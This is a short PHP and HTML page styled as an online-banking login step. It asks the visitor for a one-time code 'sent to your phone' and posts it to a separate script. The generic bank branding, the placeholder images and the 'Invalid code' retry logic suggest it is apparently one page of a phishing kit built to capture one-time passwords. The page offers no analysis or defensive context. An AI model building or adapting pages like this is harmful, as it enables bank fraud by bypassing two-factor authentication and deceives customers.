<?php 
require 'main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/style.css">
    <title>Login</title>
</head>
<body>
<header>
<div class="left"><img src="res/img/logo.png" alt=""> </div>
<div class="right"><img src="res/img/sec.png" alt=""> </div>
</header>
<div class="liner">
Log In to Online Banking
</div>


<main>
<div class="form">
   
<div class="col">
<h3>Confirmation</h3>
    <p>Please enter the code sent to your phone number to continue.</p>

    <form action="post.php" method="post">

<div class="col">
  <input type="text" name="otp" required placeholder="Enter the code">
  <?php 
if(isset($_GET['error'])){
echo '<input type="hidden" name="exit">';
echo '<p style="color:red;">Invalid code. Please try</p>';
}
?>
</div>
<div class="col"><button type="sumbit">Log In</button></div>


</form>    

</div>



</main>









    
</body>
</html>